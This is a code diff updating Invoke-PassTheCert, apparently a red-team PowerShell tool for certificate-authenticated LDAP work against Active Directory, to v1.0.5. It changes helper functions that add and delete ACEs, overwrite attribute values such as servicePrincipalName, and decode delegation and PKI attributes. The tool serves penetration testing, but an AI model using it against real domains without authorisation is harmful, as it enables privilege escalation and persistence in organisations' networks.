@@ -30,7 +30,7 @@ function _ShowBanner {
     Write-Host -ForegroundColor Red     "   _| || | | \ V / (_) |   <  __/ |______|                  "
     Write-Host -ForegroundColor Red     "   \___/_| |_|\_/ \___/|_|\_\___|                           "
     Write-Host -ForegroundColor Red     "                                                            "
-    Write-Host -ForegroundColor Red     "   v1.0.4                                                   "
+    Write-Host -ForegroundColor Red     "   v1.0.5                                                   "
     Write-Host -ForegroundColor Red     "  ______            _____ _          _____           _      "
     Write-Host -ForegroundColor Red     "  | ___ \          |_   _| |        /  __ \         | |     "
     Write-Host -ForegroundColor Red     "  | |_/ /___ ___ ___ | | | |__   ___| /  \/ ___ _ __| |_    "
@@ -6176,7 +6176,7 @@ function _Helper-ExportCertificateToFile {
 
             _Helper-ExportCertificateToFile -Certificate $Certificate -ExportPath '.\Certified.pfx' -ExportContentType 'pfx'
 
-            Exports the Certificate $Certificate into the passwordless PFX file '.\Certified.pfx'
+            Exports the Certificate $Certificate into the PFX file '.\Certified.pfx', passwordless
 
         .EXAMPLE
 
@@ -6754,32 +6754,45 @@ function _Helper-GetReadableValueOfBytes {
         [System.String]$Type,
 
         [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the array of bytes containing the value of the specified type")]
-        [byte[]]$ArrayOfBytes
+        $ArrayOfBytes
     )
+
+    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
 
     Write-Verbose "[*] Converting Array Of Bytes Of Type '$Type' Into A Human-Readable Form..."
 
-    if ($Type -eq "objectSid") {
-        $Result = New-Object System.Security.Principal.SecurityIdentifier($ArrayOfBytes, 0)
-        $Result = $Result.Value
-    } elseif ($Type -eq "nTSecurityDescriptor") {
-        $Result = New-Object System.Security.AccessControl.RawSecurityDescriptor($ArrayOfBytes, 0)
-    } elseif ($Type -eq "objectGuid") {
-        # https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1#L8176-L8179
-        # https://unlockpowershell.wordpress.com/2010/07/01/powershell-search-ad-for-a-guid/
-        # Byte order is 4th, 3rd, 2nd, 1st, 6th, 5th, 8th, 7th, 9th, 10th, ...
-        $AOB = $ArrayOfBytes
-        $ArrayOfBytes = @(
-            $AOB[3], $AOB[2], $AOB[1], $AOB[0],
-            $AOB[5], $AOB[4],
-            $AOB[7], $AOB[6]
-        ) + $AOB[8..15]
-        $Result = [Guid]::New([byte[]]$ArrayOfBytes)
+    # Some attributes CANNOT be converted, as they don't hold byte data (e.g. SID of some builtin groups). Therefore, these cases (triggering conversion errors) are NOT translated, and left as is.
+    try {
+        $ArrayOfBytes = [byte[]]$ArrayOfBytes
+        if ($Type -eq "objectSid") {
+            $Result = New-Object System.Security.Principal.SecurityIdentifier($ArrayOfBytes, 0)
+            $Result = $Result.Value
+        } elseif ($Type -eq "nTSecurityDescriptor") {
+            $Result = New-Object System.Security.AccessControl.RawSecurityDescriptor($ArrayOfBytes, 0)
+        } elseif ($Type -eq "objectGuid") {
+            # https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1#L8176-L8179
+            # https://unlockpowershell.wordpress.com/2010/07/01/powershell-search-ad-for-a-guid/
+            # Byte order is 4th, 3rd, 2nd, 1st, 6th, 5th, 8th, 7th, 9th, 10th, ...
+            $AOB = $ArrayOfBytes
+            $ArrayOfBytes = @(
+                $AOB[3], $AOB[2], $AOB[1], $AOB[0],
+                $AOB[5], $AOB[4],
+                $AOB[7], $AOB[6]
+            ) + $AOB[8..15]
+            $Result = [Guid]::New([byte[]]$ArrayOfBytes)
+        }
+
+        Write-Verbose "[+] Successfully Converted Array Of Bytes Of Type '$Type' Into A Human-Readable Form !"
+
+        return $Result
+
+    } catch {
+
+        Write-Verbose "[!] Couldn't Convert Array Of Bytes Of Type '$Type' Into A Human-Readable Form ! Returning The Input As Is..."
+        return $ArrayOfBytes
+
     }
-
-    Write-Verbose "[+] Successfully Converted Array Of Bytes Of Type '$Type' Into A Human-Readable Form !"
-
-    return $Result
+    
 
 }
 
@@ -6791,6 +6804,8 @@ function _GetAttributeOfObject {
         .SYNOPSIS
 
             Returns the Attribute the specified LDAP object
+
+            - If the array of bytes couldn't be converted, the function returns the input as is.
 
         .PARAMETER LdapConnection
 
@@ -6810,6 +6825,12 @@ function _GetAttributeOfObject {
             
             The attribute from which the value must be extracted.
 
+        .PARAMETER Raw
+
+            [Switch] 
+            
+            Whenever specified, returns the raw content of the attribute, i.e. without trying to convert it into human-readable format.
+
         .EXAMPLE
 
             $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
@@ -6827,6 +6848,18 @@ function _GetAttributeOfObject {
             _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN 'DC=X' -Attribute 'ms-DS-MachineAccountQuota'
 
             Returns the domain's MAQ (i.e. the content of the `DC=X`:`ms-DS-MachineAccountQuota` attribute), 10 by default
+
+        .EXAMPLE
+
+            _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN 'DC=X' -Attribute 'objectSid'
+
+            Returns the domain's objectSid, converted from bytes to string (default)
+
+        .EXAMPLE
+
+            _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN 'DC=X' -Attribute 'objectSid' -Raw
+
+            Returns the domain's objectSid bytes
 
         .OUTPUTS
 
@@ -6850,7 +6883,10 @@ function _GetAttributeOfObject {
         [System.String]$ObjectDN,
 
         [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the attribute of the targeted object")]
-        [System.String]$Attribute
+        [System.String]$Attribute,
+
+        [Parameter(Position=3, Mandatory=$false, HelpMessage="Switch to retrieve the raw (i.e. not converted) attribute's value. For instance, retrieving 'objectSid' will always be converted into human-readable format (e.g. S-1-1-0), unless this parameter is specified.")]
+        [Switch]$Raw
     )
     
     Write-Verbose "[*] Retrieving Attibute '$Attribute' Of Object '$ObjectDN'..."
@@ -6872,11 +6908,16 @@ function _GetAttributeOfObject {
         Write-Host "[!] Object '$ObjectDN' Not Found ! Returning `$null..."
         return $null
     } else {
+        $Value = $SearchResponse.Entries[0].Attributes[$Attribute][0]
         # Dealing with edge-cases (i.e. attribute containing bytes)
-        if ($Attribute -in @("objectSid", "nTSecurityDescriptor", "objectGuid")) {
-            $Result = _Helper-GetReadableValueOfBytes -Type $Attribute -ArrayOfBytes $SearchResponse.Entries[0].Attributes[$Attribute][0]
+        if (-not $Raw -and $Attribute -in @("objectSid", "nTSecurityDescriptor", "objectGuid")) {
+            $Result = _Helper-GetReadableValueOfBytes -Type $Attribute -ArrayOfBytes $Value
+        } elseif (-not $Raw -and $Attribute -in @("mS-DS-CreatorSID")) {
+            $Result = _Helper-GetReadableValueOfBytes -Type "objectSid" -ArrayOfBytes $Value
+        } elseif (-not $Raw -and $Attribute -in @("msds-allowedtoactonbehalfofotheridentity")) {
+            $Result = _Helper-GetReadableValueOfBytes -Type "nTSecurityDescriptor" -ArrayOfBytes $Value
         } else {
-            $Result = $SearchResponse.Entries[0].Attributes[$Attribute][0]
+            $Result = $Value
         }
         Write-Verbose "[+] Successfully Retrieved '$Result' From '$ObjectDN':'$Attribute' Attribute !"
         return $Result
@@ -7244,7 +7285,7 @@ function _Filter {
 
             [System.String] 
             
-            The Distinguished Name of the Seach Base of the LDAP lookup (e.g. 'DC=X')
+            The Distinguished Name of the Seach Base of the LDAP lookup (e.g. 'DC=X') (Optional)
 
             - If not specified, defaults to the LDAP/S Server's domain.
 
@@ -7252,7 +7293,7 @@ function _Filter {
 
             [System.String] 
             
-            The Seach Base of the LDAP lookup ('Base', 'OneLevel', or 'Subtree').
+            The Seach Base of the LDAP lookup ('Base', 'OneLevel', or 'Subtree') (Optional)
             
             - If not specified, defaults to 'Subtree', i.e. search recursively from the given Search Base)
 
@@ -7260,7 +7301,9 @@ function _Filter {
 
             [System.String] 
             
-            The Properties to be returned (e.g. 'sAMAccountName,DistinguishedName') (default: '*', i.e. return all properties of the returned object(s))
+            The Properties to be returned (e.g. 'sAMAccountName,DistinguishedName') (Optional)
+
+            - If not specified, defaults to '*', i.e. return all properties of the returned object(s).
 
         .PARAMETER LDAPFilter
 
@@ -7278,19 +7321,19 @@ function _Filter {
         
             [System.String] 
             
-            The DN to be filtered from the LDAP lookup (e.g. `CN=Administrator,CN=Users,DC=X`)
+            The DN to be filtered from the LDAP lookup (e.g. 'CN=Administrator,CN=Users,DC=X')
 
         .PARAMETER GUIDFilter
 
             [System.String] 
             
-            The GUID to be filtered from the LDAP lookup (e.g. `ad20f953-2164-2a4a-ace6-7489bb9d7bd3`)
+            The GUID to be filtered from the LDAP lookup (e.g. 'ad20f953-2164-2a4a-ace6-7489bb9d7bd3')
 
         .PARAMETER SIDFilter
 
             [System.String] 
             
-            The SID to be filtered from the LDAP lookup (e.g. `S-1-5-21-2539905369-2457893589-779357875-500`)
+            The SID to be filtered from the LDAP lookup (e.g. 'S-1-5-21-2539905369-2457893589-779357875-500')
 
         .EXAMPLE
 
@@ -7602,7 +7645,7 @@ function _Filter {
                     #   serviceprincipalname    : CIFS/DC01
                     #                             LDAP/DC01
                     # However, some very long array binaries (e.g. 'usercertificate') are not interesting to split. Hence, we'll whitelist the interesting multi-valued attributes to CRLF-split.
-                    if ($Attribute -in @('objectClass', 'serviceprincipalname', 'memberof', 'msds-keycredentiallink', 'namingcontexts', 'supportedcontrol', 'supportedsaslmechanisms', 'supportedcapabilities', 'supportedldappolicies', 'certificatetemplates', 'mspki-certificate-application-policy', 'pkicriticalextensions', 'pkiextendedkeyusage', 'pkidefaultcsps')) {
+                    if ($Attribute -in @('objectClass', 'serviceprincipalname', 'memberof', 'msds-keycredentiallink', 'namingcontexts', 'supportedcontrol', 'supportedsaslmechanisms', 'supportedcapabilities', 'supportedldappolicies', 'certificatetemplates', 'mspki-certificate-application-policy', 'pkicriticalextensions', 'pkiextendedkeyusage', 'pkidefaultcsps', 'msds-allowedtodelegateto')) {
                         $ResultObject | Add-Member -Force -NotePropertyName $Attribute -NotePropertyValue $($AttributeObject -join "`r`n")
                     } else {
                         $ResultObject | Add-Member -Force -NotePropertyName $Attribute -NotePropertyValue $AttributeObject
@@ -7687,11 +7730,43 @@ function _Filter {
 
                     'badpasswordtime' { $AddMember = $true; $NewMember = [DateTime]::FromFileTimeUtc($Property.Value) }
 
+                    'msds-allowedtoactonbehalfofotheridentity' { 
+                        $AddMember = $true;
+                        $NewMember = (_Helper-GetReadableValueOfBytes -Type 'nTSecurityDescriptor' -ArrayOfBytes $Property.Value).DiscretionaryAcl.SecurityIdentifier
+                    }
+
+                    # https://www.sysadmins.lv/blog-en/how-to-convert-pkiexirationperiod-and-pkioverlapperiod-active-directory-attributes.aspx
+                    'pkiexpirationperiod' { 
+                        $AddMember = $true;
+                        [array]::Reverse($Property.Value)
+                        $LittleEndianByte = -join ($Property.Value | %{"{0:x2}" -f $_})
+                        $Value = [Convert]::ToInt64($LittleEndianByte,16) * -.0000001
+                        if (!($Value % 31536000) -and ($Value / 31536000) -ge 1) { $NewMember = [string]($Value / 31536000) + " year(s)" }
+                        elseif (!($Value % 2592000) -and ($Value / 2592000) -ge 1) { $NewMember = [string]($Value / 2592000) + " month(s)" }
+                        elseif (!($Value % 604800) -and ($Value / 604800) -ge 1) { $NewMember = [string]($Value / 604800) + " week(s)" }
+                        elseif (!($Value % 86400) -and ($Value / 86400) -ge 1) { $NewMember = [string]($Value / 86400) + " day(s)" }
+                        elseif (!($Value % 3600) -and ($Value / 3600) -ge 1) { $NewMember = [string]($Value / 3600) + " hour(s)" }
+                        else { $NewMember = "0 hour(s)" }
+                    }
+
+                    # https://www.sysadmins.lv/blog-en/how-to-convert-pkiexirationperiod-and-pkioverlapperiod-active-directory-attributes.aspx
+                    'pkioverlapperiod' { 
+                        $AddMember = $true;
+                        ([array]::Reverse($Property.Value))
+                        $LittleEndianByte = -join ($Property.Value | %{"{0:x2}" -f $_})
+                        $Value = [Convert]::ToInt64($LittleEndianByte,16) * -.0000001
+                        if (!($Value % 31536000) -and ($Value / 31536000) -ge 1) { $NewMember = [string]($Value / 31536000) + " year(s)" }
+                        elseif (!($Value % 2592000) -and ($Value / 2592000) -ge 1) { $NewMember = [string]($Value / 2592000) + " month(s)" }
+                        elseif (!($Value % 604800) -and ($Value / 604800) -ge 1) { $NewMember = [string]($Value / 604800) + " week(s)" }
+                        elseif (!($Value % 86400) -and ($Value / 86400) -ge 1) { $NewMember = [string]($Value / 86400) + " day(s)" }
+                        elseif (!($Value % 3600) -and ($Value / 3600) -ge 1) { $NewMember = [string]($Value / 3600) + " hour(s)" }
+                        else { $NewMember = "0 hour(s)" }
+                    }
+
                 }
 
-                # Some attributes CANNOT be converted, as they don't hold byte data (e.g. SID of some builtin groups). Therefore, these cases (triggering conversion errors) are NOT translated, and left as is.
                 if ($AddMember) {
-                    try { $_ |Add-Member -Force -NotePropertyName $Property.Name -NotePropertyValue $NewMember } catch {}
+                    $_ |Add-Member -Force -NotePropertyName $Property.Name -NotePropertyValue $NewMember
                 }
 
             }
@@ -8507,11 +8582,11 @@ function _CreateInboundACE {
             # Some ACEs doesn't have 'ObjectAceType' attribute (e.g. 'GenericAll'), hence being set to None.
             # Writing the Check / Restoration texts for convenience
             if ($AccessRightGUID -eq [Guid]::Empty) {
-                Write-Host "[*] [Check] Invoke-PassTheCert -Action 'GetInboundACEs' -LdapConnection `$LdapConnection -ObjectDN '$TargetDN' |?{ `$_.SecurityIdentifier -eq '$(_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute "objectSid")' }"
-                Write-Host "[*] [Delete] Invoke-PassTheCert -Action 'DeleteInboundACE' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -Target '$TargetDN' -AceQualifier '$AceQualifier' -AccessMaskNames '$(_Helper-GetNamesOfACEAccessMaskValue -Value $AccessMaskValue)'"
+                Write-Host "[*] [Check] Invoke-PassTheCert -Action 'GetInboundACEs' -LdapConnection `$LdapConnection -Object '$TargetDN' |?{ `$_.SecurityIdentifier -eq '$(_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute "objectSid")' }"
+                Write-Host "[*] [Restore] Invoke-PassTheCert -Action 'DeleteInboundACE' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -Target '$TargetDN' -AceQualifier '$AceQualifier' -AccessMaskNames '$(_Helper-GetNamesOfACEAccessMaskValue -Value $AccessMaskValue)'"
             } else {
-                Write-Host "[*] [Check] Invoke-PassTheCert -Action 'GetInboundACEs' -LdapConnection `$LdapConnection -ObjectDN '$TargetDN' |?{ `$_.SecurityIdentifier -eq '$(_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute "objectSid")' }"
-                Write-Host "[*] [Delete] Invoke-PassTheCert -Action 'DeleteInboundACE' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -Target '$TargetDN' -AceQualifier '$AceQualifier' -AccessMaskNames '$(_Helper-GetNamesOfACEAccessMaskValue -Value $AccessMaskValue)' -AccessRightGUID '$AccessRightGUID'"
+                Write-Host "[*] [Check] Invoke-PassTheCert -Action 'GetInboundACEs' -LdapConnection `$LdapConnection -Object '$TargetDN' |?{ `$_.SecurityIdentifier -eq '$(_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute "objectSid")' }"
+                Write-Host "[*] [Restore] Invoke-PassTheCert -Action 'DeleteInboundACE' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -Target '$TargetDN' -AceQualifier '$AceQualifier' -AccessMaskNames '$(_Helper-GetNamesOfACEAccessMaskValue -Value $AccessMaskValue)' -AccessRightGUID '$AccessRightGUID'"
             }
             return $null
         }
@@ -8566,11 +8641,11 @@ function _CreateInboundACE {
     # Some ACEs doesn't have 'ObjectAceType' attribute (e.g. 'GenericAll'), hence being set to None.
     # Writing the Check / Restoration texts for convenience
     if ($AccessRightGUID -eq [Guid]::Empty) {
-        Write-Host "[*] [Check] Invoke-PassTheCert -Action 'GetInboundACEs' -LdapConnection `$LdapConnection -ObjectDN '$TargetDN' |?{ `$_.SecurityIdentifier -eq '$(_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute "objectSid")' }"
-        Write-Host "[*] [Delete] Invoke-PassTheCert -Action 'DeleteInboundACE' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -Target '$TargetDN' -AceQualifier '$AceQualifier' -AccessMaskNames '$(_Helper-GetNamesOfACEAccessMaskValue -Value $AccessMaskValue)'"
+        Write-Host "[*] [Check] Invoke-PassTheCert -Action 'GetInboundACEs' -LdapConnection `$LdapConnection -Object '$TargetDN' |?{ `$_.SecurityIdentifier -eq '$(_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute "objectSid")' }"
+        Write-Host "[*] [Restore] Invoke-PassTheCert -Action 'DeleteInboundACE' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -Target '$TargetDN' -AceQualifier '$AceQualifier' -AccessMaskNames '$(_Helper-GetNamesOfACEAccessMaskValue -Value $AccessMaskValue)'"
     } else {
-        Write-Host "[*] [Check] Invoke-PassTheCert -Action 'GetInboundACEs' -LdapConnection `$LdapConnection -ObjectDN '$TargetDN' |?{ `$_.SecurityIdentifier -eq '$(_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute "objectSid")' }"
-        Write-Host "[*] [Delete] Invoke-PassTheCert -Action 'DeleteInboundACE' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -Target '$TargetDN' -AceQualifier '$AceQualifier' -AccessMaskNames '$(_Helper-GetNamesOfACEAccessMaskValue -Value $AccessMaskValue)' -AccessRightGUID '$AccessRightGUID'"
+        Write-Host "[*] [Check] Invoke-PassTheCert -Action 'GetInboundACEs' -LdapConnection `$LdapConnection -Object '$TargetDN' |?{ `$_.SecurityIdentifier -eq '$(_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute "objectSid")' }"
+        Write-Host "[*] [Restore] Invoke-PassTheCert -Action 'DeleteInboundACE' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -Target '$TargetDN' -AceQualifier '$AceQualifier' -AccessMaskNames '$(_Helper-GetNamesOfACEAccessMaskValue -Value $AccessMaskValue)' -AccessRightGUID '$AccessRightGUID'"
     }
 }
 
@@ -8754,7 +8829,7 @@ function _DeleteInboundACE {
             
             Write-Host "[+] Successfully Deleted Inbound ACE $ACEString Provided To Principal '$IdentityDN' Towards '$TargetDN' !"
 
-            #Write-Verbose "[*] Remaining Inbound ACEs Provided To Principal '$IdentityDN' Towards '$TargetDN' Are:`r`n$(_GetInboundACEs -LdapConnection $LdapConnection -ObjectDN $TargetDN | Where-Object { $ACE.SecurityIdentifier -eq $IdentitySID } |Out-String)"
+            #Write-Verbose "[*] Remaining Inbound ACEs Provided To Principal '$IdentityDN' Towards '$TargetDN' Are:`r`n$(_GetInboundACEs -LdapConnection $LdapConnection -Object $TargetDN | Where-Object { $ACE.SecurityIdentifier -eq $IdentitySID } |Out-String)"
             return 
         }
         $i++;
@@ -9073,11 +9148,11 @@ function _CreateInboundSDDL {
 
     Write-Host "[+] Successfully Inserted SDDL ACE String '$ACEString' For Principal '$IdentityDN', Targeting $TargetString !"
 
-    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'GetInboundSDDLs' -LdapConnection `$LdapConnection -ObjectDN '$TargetDN' |%{(`$_ -replace '\(',`"``n  `" -replace '\)','').Split(`"``n`") } |Select-String -Pattern '$(_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute "objectSid")`$'"
+    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'GetInboundSDDLs' -LdapConnection `$LdapConnection -Object '$TargetDN' |%{(`$_ -replace '\(',`"``n  `" -replace '\)','').Split(`"``n`") } |Select-String -Pattern '$(_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute "objectSid")`$'"
     if ($Attribute) {
-        Write-Host "[*] [Delete] Invoke-PassTheCert -Action 'DeleteInboundACE' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -Target '$TargetDN' -AceQualifier '$ACETypeString' -AccessMaskNames '$(_Helper-GetNamesOfACEAccessMaskValue -Value $AccessMaskValue)' -AccessRightGUID '$SDDLObjectAceType'"
+        Write-Host "[*] [Restore] Invoke-PassTheCert -Action 'DeleteInboundACE' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -Target '$TargetDN' -AceQualifier '$ACETypeString' -AccessMaskNames '$(_Helper-GetNamesOfACEAccessMaskValue -Value $AccessMaskValue)' -AccessRightGUID '$SDDLObjectAceType'"
     } else {
-        Write-Host "[*] [Delete] Invoke-PassTheCert -Action 'DeleteInboundACE' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -Target '$TargetDN' -AceQualifier '$ACETypeString' -AccessMaskNames '$(_Helper-GetNamesOfACEAccessMaskValue -Value $AccessMaskValue)'"
+        Write-Host "[*] [Restore] Invoke-PassTheCert -Action 'DeleteInboundACE' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -Target '$TargetDN' -AceQualifier '$ACETypeString' -AccessMaskNames '$(_Helper-GetNamesOfACEAccessMaskValue -Value $AccessMaskValue)'"
     }
     return
 }
@@ -9178,7 +9253,7 @@ function _OverwriteValueInAttribute {
             
             The established LDAP Connection Instance.
 
-        .PARAMETER IdentityDN
+        .PARAMETER ObjectDN
 
             [System.String] 
             
@@ -9191,8 +9266,6 @@ function _OverwriteValueInAttribute {
             The attribute of the targeted object (e.g. `description`).
 
         .PARAMETER Value
-
-            [System.String] 
             
             The new value to set on the specified attribute (e.g. `!D3$cR1Pt4t0R!`).
 
@@ -9204,19 +9277,19 @@ function _OverwriteValueInAttribute {
 
         .EXAMPLE
 
-            _OverwriteValueInAttribute -LdapConnection $LdapConnection -IdentityDN 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'description' -Value '!D3$cR1Pt4t0R!'
+            _OverwriteValueInAttribute -LdapConnection $LdapConnection -ObjectDN 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'description' -Value '!D3$cR1Pt4t0R!'
 
             Overwrites the value of attribute `description` of object `John JD. DOE` to `!D3$cR1Pt4t0R!`
 
         .EXAMPLE
 
-            _OverwriteValueInAttribute -LdapConnection $LdapConnection -IdentityDN 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'serviceprincipalname' -Value 'TERMSRV/SRV01'
+            _OverwriteValueInAttribute -LdapConnection $LdapConnection -ObjectDN 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'serviceprincipalname' -Value 'TERMSRV/SRV01'
 
             Overwrites the whole content of attribute `serviceprincipalname` of object `John JD. DOE` to `TERMSRV/SRV01`. Being a multi-valued attribute, if `serviceprincipalname` was set to `[CIFS/SRV01, LDAP/SRV01, HTTP/SRV01]`, then this would leave it to `[TERMSRV/SRV01]` only.
 
         .EXAMPLE
 
-            _OverwriteValueInAttribute -LdapConnection $LdapConnection -IdentityDN 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'displayName' -Value 'My Name Is... "D''oh!!" !!'
+            _OverwriteValueInAttribute -LdapConnection $LdapConnection -ObjectDN 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'displayName' -Value 'My Name Is... "D''oh!!" !!'
 
             Overwrites the value of attribute `displayName` of object `John JD. DOE` to `My Name Is... "D'oh!!" !!`.
 
@@ -9237,30 +9310,30 @@ function _OverwriteValueInAttribute {
         [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,
 
         [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the identity of the targeted object whose attribute's value must be overwritten")]
-        [System.String]$IdentityDN,
+        [System.String]$ObjectDN,
 
         [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the attribute of the targeted object")]
         [System.String]$Attribute,
 
         [Parameter(Position=3, Mandatory=$true, HelpMessage="Enter the new value")]
-        [System.String]$Value
+        $Value
     )
 
     _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
 
-    Write-Verbose "[*] Overwritting Value Of '$IdentityDN':'$Attribute' To '$Value'..."
+    Write-Verbose "[*] Overwritting Value Of '$ObjectDN':'$Attribute' To '$Value'..."
 
     $LdapConnection.SendRequest(
         (New-Object System.DirectoryServices.Protocols.ModifyRequest(
-            $IdentityDN,
+            $ObjectDN,
             [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, 
             $Attribute,
             $Value
         ))
     ) |Out-Null
 
-    Write-Host "[+] Successfully Overwritten Value Of '$IdentityDN':'$Attribute' To '$Value' !"
-    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$IdentityDN' -SearchScope Base -Properties '$Attribute' |fl"
+    Write-Host "[+] Successfully Overwritten Value Of '$ObjectDN':'$Attribute' To '$Value' !"
+    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$ObjectDN' -SearchScope Base -Properties '$Attribute' |fl"
     return
 }
 
@@ -9281,7 +9354,7 @@ function _AddValueInAttribute {
             
             The established LDAP Connection Instance.
 
-        .PARAMETER IdentityDN
+        .PARAMETER ObjectDN
 
             [System.String] 
             
@@ -9307,19 +9380,19 @@ function _AddValueInAttribute {
 
         .EXAMPLE
 
-            _AddValueInAttribute -LdapConnection $LdapConnection -IdentityDN 'CN=J0hn JR. RIPP3R,CN=Users,DC=X' -Attribute 'description' -Value '%Hacked By @!xX_C3rT1fi3d_Xx!%'
+            _AddValueInAttribute -LdapConnection $LdapConnection -ObjectDN 'CN=J0hn JR. RIPP3R,CN=Users,DC=X' -Attribute 'description' -Value '%Hacked By @!xX_C3rT1fi3d_Xx!%'
 
             Sets the value `%Hacked By @!xX_C3rT1fi3d_Xx!%` to attribute `description` of object `J0hn JR. RIPP3R` (if the attribute's value was undefined, or empty).
 
         .EXAMPLE
 
-            _AddValueInAttribute -LdapConnection $LdapConnection -IdentityDN 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'displayName' -Value 'My Name Is... "D''oh!!" !!'
+            _AddValueInAttribute -LdapConnection $LdapConnection -ObjectDN 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'displayName' -Value 'My Name Is... "D''oh!!" !!'
 
             Sets the value `My Name Is... "D'oh!!" !!` to attribute `displayName` of object `John JD. DOE` (if the attribute's value was undefined, or empty).
 
         .EXAMPLE
 
-            _AddValueInAttribute -LdapConnection $LdapConnection -IdentityDN 'CN=Ash AC. C4T,CN=Users,DC=X' -Attribute 'serviceprincipalname' -Value 'CIFS/SRV01'
+            _AddValueInAttribute -LdapConnection $LdapConnection -ObjectDN 'CN=Ash AC. C4T,CN=Users,DC=X' -Attribute 'serviceprincipalname' -Value 'CIFS/SRV01'
 
             Adds the value `HTTP/GETH4HSH` from the attribute `serviceprincipalname` of object `Ash AC. C4T`. Being a multi-valued attribute, if `serviceprincipalname` was set to `[CIFS/SRV01, LDAP/SRV01]`, then this would leave it to `[CIFS/SRV01, LDAP/SRV01], HTTP/GETH4HSH]`
 
@@ -9340,7 +9413,7 @@ function _AddValueInAttribute {
         [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,
 
         [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the identity of the targeted object whose attribute's value must be added")]
-        [System.String]$IdentityDN,
+        [System.String]$ObjectDN,
 
         [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the attribute of the targeted object")]
         [System.String]$Attribute,
@@ -9351,20 +9424,20 @@ function _AddValueInAttribute {
 
     _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
 
-    Write-Verbose "[*] Adding Value '$Value' In Attribute '$IdentityDN':'$Attribute'..."
+    Write-Verbose "[*] Adding Value '$Value' In Attribute '$ObjectDN':'$Attribute'..."
 
     $LdapConnection.SendRequest(
         (New-Object System.DirectoryServices.Protocols.ModifyRequest(
-            $IdentityDN, 
+            $ObjectDN, 
             [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add, 
             $Attribute, 
             $Value
         ))
     ) |Out-Null
 
-    Write-Host "[+] Successfully Added Value '$Value' In Attribute '$IdentityDN':'$Attribute' !"
-    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$IdentityDN' -SearchScope Base -Properties '$Attribute' |fl"
-    Write-Host "[*] [Remove] Invoke-PassTheCert -Action 'RemoveValueInAttribute' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -Attribute '$Attribute' -Value '$Value'"
+    Write-Host "[+] Successfully Added Value '$Value' In Attribute '$ObjectDN':'$Attribute' !"
+    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$ObjectDN' -SearchScope Base -Properties '$Attribute' |fl"
+    Write-Host "[*] [Restore] Invoke-PassTheCert -Action 'RemoveValueInAttribute' -LdapConnection `$LdapConnection -Object '$ObjectDN' -Attribute '$Attribute' -Value '$Value'"
 
     return
 }
@@ -9386,7 +9459,7 @@ function _RemoveValueInAttribute {
             
             The established LDAP Connection Instance.
 
-        .PARAMETER IdentityDN
+        .PARAMETER ObjectDN
 
             [System.String] 
             
@@ -9412,19 +9485,19 @@ function _RemoveValueInAttribute {
 
         .EXAMPLE
 
